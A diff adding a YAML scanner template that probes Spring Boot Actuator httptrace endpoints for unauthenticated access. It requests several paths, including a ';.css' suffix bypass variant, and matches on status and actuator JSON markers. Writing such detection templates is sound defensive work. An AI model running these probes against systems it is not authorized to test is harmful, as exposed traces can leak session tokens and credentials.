@@ -1,0 +1,24 @@
+id: poc-yaml-actuator-httptrace-unauth-access
+info:
+  name: Spring Boot Actuator httptrace 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: Spring Boot
+  osprey-id: vb_2022_0006
+variables:
+  v_path: '/actuator/httptrace
+
+    /jeecg-boot/actuator/httptrace
+
+    /api/actuator/httptrace
+
+    /actuator/httptrace;.css'
+requests:
+- method: GET
+  path: '{{.v_path}}'
+  expression: 'status_code == 200 && contains(body, "{\"traces\"") && contains(headers,
+    "Content-Type: application/vnd.spring-boot.actuator.v2+json")
+
+    '
+transport: http
